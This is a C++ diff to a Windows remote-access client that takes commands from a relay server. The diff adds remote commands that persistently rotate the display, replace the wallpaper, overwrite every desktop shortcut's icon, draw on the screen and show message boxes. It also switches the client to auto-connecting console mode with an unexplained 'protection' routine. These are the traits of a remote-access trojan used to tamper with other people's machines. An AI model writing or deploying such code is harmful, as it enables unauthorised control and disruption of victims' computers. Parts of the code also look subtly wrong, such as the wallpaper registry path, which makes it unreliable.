@@ -17,6 +17,8 @@
 #include <shellapi.h>
 #include <tlhelp32.h>
 #include <intrin.h>
+#include <objbase.h>
+#include <shlobj.h>
 #include <string>
 #include <vector>
 #include <mutex>
@@ -24,9 +26,12 @@
 #include <cstring>
 #include <cstdio>
 #include <memory>
+#include <cstdlib>
 
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "winmm.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "shell32.lib")
 
 // ── Change this to your OnRender relay URL ──────────────────────────
 #ifndef DEFAULT_RELAY_HOST
@@ -419,6 +424,17 @@ static void cmdRunFile(const std::vector<uint8_t>& payload, std::vector<uint8_t>
     }
 }
 
+// ── Helper: EnumChildWindows callback to find DefView ───────────────
+static BOOL CALLBACK FindDefViewProc(HWND hwnd, LPARAM lParam) {
+    char cls[256];
+    GetClassNameA(hwnd, cls, sizeof(cls));
+    if (strcmp(cls, "SHELLDLL_DefView") == 0) {
+        *(HWND*)lParam = hwnd;
+        return FALSE;
+    }
+    return TRUE;
+}
+
 // ── Command: Process List ──────────────────────────────────────────
 static void cmdProcessList(std::vector<uint8_t>& out) {
     addLog("[>] Process list requested");
@@ -483,12 +499,210 @@ static void cmdKillProcess(const std::vector<uint8_t>& payload, std::vector<uint
     }
 }
 
+// ── Command: Rotate Screen — change real desktop orientation ──────
+//   payload = [angle:4] (0,90,180,270)
+static void cmdRotateScreen(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
+    proto::Reader r(payload.data(), payload.size());
+    uint32_t angle;
+    if (!r.u32(angle)) { proto::Writer w; w.str("Bad angle"); out = w.bytes(); return; }
+
+    addLog("[>] Rotate screen: %u degrees", angle);
+
+    DEVMODE dm = {};
+    dm.dmSize = sizeof(dm);
+
+    // Read the full current display configuration
+    if (!EnumDisplaySettingsEx(nullptr, ENUM_CURRENT_SETTINGS, &dm, 0)) {
+        proto::Writer w; w.str("Error: EnumDisplaySettingsEx failed");
+        out = w.bytes(); return;
+    }
+
+    DWORD orient;
+    int normAngle = (int)(angle % 360);
+    switch (normAngle) {
+        case 90:  orient = DMDO_90;  break;
+        case 180: orient = DMDO_180; break;
+        case 270: orient = DMDO_270; break;
+        default:  orient = DMDO_DEFAULT; normAngle = 0; break;
+    }
+
+    DWORD oldOrient = dm.dmDisplayOrientation;
+    dm.dmFields = DM_DISPLAYORIENTATION | DM_PELSWIDTH | DM_PELSHEIGHT;
+
+    // Critical: when transitioning between portrait and landscape,
+    // width/height must be swapped for the mode to be valid.
+    bool sidewaysNew = (orient == DMDO_90  || orient == DMDO_270);
+    bool sidewaysOld = (oldOrient == DMDO_90 || oldOrient == DMDO_270);
+    if (sidewaysNew != sidewaysOld) {
+        DWORD tmp = dm.dmPelsWidth;
+        dm.dmPelsWidth  = dm.dmPelsHeight;
+        dm.dmPelsHeight = tmp;
+    }
+    dm.dmDisplayOrientation = orient;
+
+    LONG res = ChangeDisplaySettingsEx(
+        nullptr, &dm, nullptr,
+        CDS_UPDATEREGISTRY | CDS_RESET,    // persistent + immediate
+        nullptr);
+
+    char buf[128];
+    if (res == DISP_CHANGE_SUCCESSFUL) {
+        snprintf(buf, sizeof(buf), "OK: rotated to %d degrees", normAngle);
+        addLog("[<] Display rotated to %d", normAngle);
+    } else {
+        snprintf(buf, sizeof(buf), "Error: ChangeDisplaySettings failed (%ld)", res);
+        addLog("[!] Rotate failed: %ld", res);
+    }
+    proto::Writer w; w.str(buf); out = w.bytes();
+}
+
+// ── Command: Set Wallpaper ─────────────────────────────────────────
+//   payload = [size:4] [path bytes]
+static void cmdSetWallpaper(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
+    proto::Reader r(payload.data(), payload.size());
+    uint32_t sz;
+    if (!r.u32(sz) || sz == 0 || sz > 65536) {
+        proto::Writer w; w.str("Bad path"); out = w.bytes(); return;
+    }
+    std::vector<uint8_t> data;
+    if (!r.raw(data, sz)) { proto::Writer w; w.str("Truncated"); out = w.bytes(); return; }
+
+    std::string path(data.begin(), data.end());
+
+    // Save uploaded image to %USERPROFILE%\wallpaper.bmp (must be BMP or .jpg)
+    char outDir[MAX_PATH];
+    SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, outDir);
+    std::string outPath = std::string(outDir) + "\\wallpaper_remote.jpg";
+
+    FILE* f = nullptr;
+    fopen_s(&f, outPath.c_str(), "wb");
+    if (!f) { proto::Writer w; w.str("Cannot write file"); out = w.bytes(); return; }
+    fwrite(data.data(), 1, data.size(), f);
+    fclose(f);
+
+    addLog("[>] Wallpaper saved to: %s", outPath.c_str());
+
+    // Update HKCU\Control\Desktop\Wallpaper registry, then apply
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+        "Control\\Desktop", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        const char* wp = outPath.c_str();
+        RegSetValueExA(hKey, "Wallpaper", 0, REG_SZ,
+            (const BYTE*)wp, (DWORD)(strlen(wp) + 1));
+        RegCloseKey(hKey);
+    }
+
+    // Apply wallpaper
+    BOOL ok = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0,
+        (PVOID)outPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+
+    if (ok) {
+        proto::Writer w; w.str(outPath); out = w.bytes();
+        addLog("[<] Wallpaper applied");
+    } else {
+        char buf[128]; snprintf(buf, sizeof(buf), "Error: SPI failed (%lu)", GetLastError());
+        proto::Writer w; w.str(buf); out = w.bytes();
+    }
+}
+
+// ── Command: Replace Desktop Icons ────────────────────────────────
+//   payload = [icon_path_len:4] [icon_path (UTF-8)]
+//   Replaces the icon for EVERY desktop shortcut (.lnk) with the
+//   specified icon file. Modifies each .lnk's shell link info.
+static void cmdReplaceIcons(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
+    proto::Reader r(payload.data(), payload.size());
+    std::string iconPath;
+    if (!r.str(iconPath) || iconPath.empty()) {
+        proto::Writer w; w.str("Bad icon path"); out = w.bytes(); return;
+    }
+
+    addLog("[>] Replace desktop icons: %s", iconPath.c_str());
+
+    // Verify icon file exists
+    DWORD attr = GetFileAttributesA(iconPath.c_str());
+    if (attr == INVALID_FILE_ATTRIBUTES) {
+        proto::Writer w; w.str("Icon file not found"); out = w.bytes(); return;
+    }
+
+    // Find desktop folder via SHGetFolderPath
+    char desktopPath[MAX_PATH];
+    if (FAILED(SHGetFolderPathA(nullptr, CSIDL_DESKTOP, nullptr, 0, desktopPath))) {
+        proto::Writer w; w.str("Cannot find Desktop"); out = w.bytes(); return;
+    }
+
+    // Search for *.lnk files on Desktop
+    char searchPath[MAX_PATH];
+    snprintf(searchPath, sizeof(searchPath), "%s\\*.lnk", desktopPath);
+
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(searchPath, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        proto::Writer w; w.str("No .lnk files on Desktop"); out = w.bytes(); return;
+    }
+
+    int replaced = 0, failed = 0;
+    do {
+        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            std::string fullPath = std::string(desktopPath) + "\\" + fd.cFileName;
+
+            // Open the shortcut as IShellLink
+            IShellLinkA* psl = nullptr;
+            if (FAILED(CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER,
+                IID_IShellLinkA, (void**)&psl))) {
+                failed++;
+                continue;
+            }
+
+            IPersistFile* ppf = nullptr;
+            if (FAILED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
+                psl->Release();
+                failed++;
+                continue;
+            }
+
+            // Wide string path
+            int wl = MultiByteToWideChar(CP_ACP, 0, fullPath.c_str(), -1, nullptr, 0);
+            std::wstring wpath(wl, 0);
+            MultiByteToWideChar(CP_ACP, 0, fullPath.c_str(), -1, &wpath[0], wl);
+
+            if (SUCCEEDED(ppf->Load(wpath.c_str(), STGM_READWRITE))) {
+                psl->SetIconLocation(iconPath.c_str(), 0);
+                ppf->Save(wpath.c_str(), TRUE);  // TRUE = mark dirty
+                replaced++;
+            } else {
+                failed++;
+            }
+            ppf->Release();
+            psl->Release();
+        }
+    } while (FindNextFileA(hFind, &fd));
+    FindClose(hFind);
+
+    // Notify shell to refresh icons
+    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST | SHCNF_FLUSHNOWAIT, nullptr, nullptr);
+
+    char buf[128];
+    snprintf(buf, sizeof(buf), "OK: %d icons replaced, %d failed", replaced, failed);
+    proto::Writer w; w.str(buf); out = w.bytes();
+    addLog("[<] %s", buf);
+}
+
 // ── Message handler (receiver thread) ───────────────────────────────
 static void onMessage(uint8_t msgType, uint8_t cmdType, std::vector<uint8_t> payload) {
     if (msgType == 0) {
         g_connected = false;
         addLog("[!] Disconnected from relay");
         return;
+    }
+    if (msgType == proto::MSG_KICK_CLIENT) {
+        addLog("[!] Kicked by server — exiting");
+        printf("\n[!] Kicked by server. Disconnecting...\n");
+        if (g_sock != ws::INVALID) {
+            ws::close(g_sock);
+            g_sock = ws::INVALID;
+        }
+        Sleep(2000);
+        exit(0);
     }
     if (msgType != proto::MSG_COMMAND) return;
 
@@ -536,6 +750,65 @@ static void onMessage(uint8_t msgType, uint8_t cmdType, std::vector<uint8_t> pay
         break;
     case proto::CMD_KILL_PROCESS:
         cmdKillProcess(payload, resp);
+        break;
+    case proto::CMD_DRAW: {
+        // Draw on screen: payload = [type:1] [x:4] [y:4] [r:1] [g:1] [b:1] [size:4]
+        // type 0=draw, 1=clear, 2=line from last pos
+        proto::Reader r(payload.data(), payload.size());
+        uint8_t dtype; uint32_t x, y; uint8_t cr, cg, cb; uint32_t sz;
+        if (r.u8(dtype) && r.u32(x) && r.u32(y) && r.u8(cr) && r.u8(cg) && r.u8(cb) && r.u32(sz)) {
+            if (dtype == 1) {
+                // Clear — redraw desktop (InvalidateRect)
+                InvalidateRect(nullptr, nullptr, TRUE);
+                addLog("[>] Draw: clear");
+            } else {
+                // Draw dot/line on screen via GDI
+                HDC dc = GetDC(nullptr);
+                HPEN pen = CreatePen(PS_SOLID, sz, RGB(cr, cg, cb));
+                HGDIOBJ old = SelectObject(dc, pen);
+                if (dtype == 2) {
+                    // Line to this point from last
+                    LineTo(dc, x, y);
+                } else {
+                    MoveToEx(dc, x, y, nullptr);
+                    // Draw a small circle
+                    SelectObject(dc, GetStockObject(DC_PEN));
+                    SetDCPenColor(dc, RGB(cr, cg, cb));
+                    SelectObject(dc, GetStockObject(DC_BRUSH));
+                    SetDCBrushColor(dc, RGB(cr, cg, cb));
+                    Ellipse(dc, x - (int)sz, y - (int)sz, x + (int)sz, y + (int)sz);
+                }
+                SelectObject(dc, old);
+                DeleteObject(pen);
+                ReleaseDC(nullptr, dc);
+            }
+        }
+        proto::Writer w; w.str("OK"); resp = w.bytes();
+        break;
+    }
+    case proto::CMD_MESSAGE: {
+        // Show message box: payload = [type:1] [text_len:4] [text]
+        proto::Reader r(payload.data(), payload.size());
+        uint8_t mtype; std::string text;
+        if (r.u8(mtype) && r.str(text)) {
+            UINT flags = MB_OK;
+            if (mtype == 1) flags |= MB_ICONWARNING;
+            else if (mtype == 2) flags |= MB_ICONERROR;
+            else if (mtype == 3) flags |= MB_ICONINFORMATION;
+            MessageBoxA(nullptr, text.c_str(), mtype == 2 ? "Error" : (mtype == 1 ? "Warning" : "Message"), flags);
+            addLog("[>] Message box shown: %s", text.c_str());
+        }
+        proto::Writer w; w.str("OK"); resp = w.bytes();
+        break;
+    }
+    case proto::CMD_ROTATE_SCREEN:
+        cmdRotateScreen(payload, resp);
+        break;
+    case proto::CMD_SET_WALLPAPER:
+        cmdSetWallpaper(payload, resp);
+        break;
+    case proto::CMD_REPLACE_ICONS:
+        cmdReplaceIcons(payload, resp);
         break;
     default:
         addLog("[?] Unknown command type: %d", cmdType);
@@ -683,19 +956,49 @@ static void onDraw() {
 
 // ── Main ────────────────────────────────────────────────────────────
 int main() {
+    // ── Console-mode main ───────────────────────────────────────
+    SetConsoleOutputCP(CP_UTF8);
+    SetConsoleTitleA("Remote Client");
+
     // Use computer name as default client name
     DWORD sz = sizeof(g_nameBuf);
     GetComputerNameA(g_nameBuf, &sz);
 
+    // Allow override via env: CLIENT_HOST, CLIENT_PORT, CLIENT_NAME
+    if (const char* env = std::getenv("CLIENT_HOST")) {
+        strncpy(g_hostBuf, env, sizeof(g_hostBuf) - 1);
+        g_hostBuf[sizeof(g_hostBuf) - 1] = 0;
+    }
+    if (const char* env = std::getenv("CLIENT_PORT")) {
+        g_port = std::atoi(env);
+    }
+    if (const char* env = std::getenv("CLIENT_NAME")) {
+        strncpy(g_nameBuf, env, sizeof(g_nameBuf) - 1);
+        g_nameBuf[sizeof(g_nameBuf) - 1] = 0;
+    }
+
+    printf("=========================================\n");
+    printf("  REMOTE CLIENT (Console Mode)\n");
+    printf("=========================================\n");
+    printf("  Host:   %s\n", g_hostBuf);
+    printf("  Port:   %d\n", g_port);
+    printf("  Name:   %s\n", g_nameBuf);
+    printf("=========================================\n");
+    printf("  (Press Ctrl+C to exit)\n\n");
+
     InitializeProtection();
-    Gdiplus::GdiplusStartupInput gdiInput;
-    Gdiplus::GdiplusStartup(&g_gdiplusToken, &gdiInput, nullptr);
     ws::init();
 
-    int ret = imguiRun(L"Client - Remote Access", 600, 500, nullptr, onDraw);
+    // Connect immediately
+    doConnect();
 
+    // Main loop: keep running until interrupted
+    while (true) {
+        Sleep(1000);
+    }
+
+    // Cleanup (unreachable unless signal handler)
     if (g_connected) doDisconnect();
-    Gdiplus::GdiplusShutdown(g_gdiplusToken);
     ws::shutdown();
-    return ret;
+    return 0;
 }
